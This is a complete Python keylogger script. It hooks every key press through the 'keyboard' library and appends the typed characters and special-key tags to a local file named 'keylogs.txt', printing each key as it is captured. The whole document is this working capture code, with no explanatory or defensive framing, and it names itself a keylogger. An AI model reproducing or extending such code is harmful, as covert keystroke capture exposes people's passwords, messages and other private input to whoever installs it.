import keyboard
def on_press(event):
    try:
        with open('keylogs.txt', 'a') as f:
            print(f'Key captured: {event.name}')
            if event.event_type == 'down':
                if event.name.isalnum():
                    f.write(event.name)
                elif event.name == 'space':
                    f.write(' ')
                elif event.name == 'enter':
                    f.write('[ENTER]')
                elif event.name in ['shift', 'shift_l', 'shift_r'] and not keyboard.is_pressed('shift+shift'):
                    f.write('[SHIFT]')
                elif event.name == 'tab':
                    f.write('[TAB]')
                elif event.name == 'esc':
                    f.write('[ESC]')
                elif event.name == 'backspace':
                    f.write('[BACKSPACE]')
            # Add more special keys as needed
    except OSError as e:
        print(f'File Error: {str(e)}')
keyboard.on_press(on_press)
try:
    keyboard.wait()
except KeyboardInterrupt:
    print('Keylogger stopped by user.')
